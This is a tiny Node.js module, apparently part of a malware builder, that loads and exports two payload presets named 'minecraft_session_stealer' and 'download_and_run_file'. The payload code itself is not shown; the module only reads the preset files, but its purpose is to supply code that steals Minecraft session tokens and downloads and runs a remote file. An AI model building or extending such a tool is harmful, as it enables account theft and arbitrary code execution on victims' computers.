const fs = require('fs');

module.exports = {
    minecraft_session_stealer: fs.readFileSync(__dirname + '/./presets/minecraft_session_stealer.js', 'utf8'),
    download_and_run_file: fs.readFileSync(__dirname + '/./presets/download_and_run_file.js', 'utf8'),
};
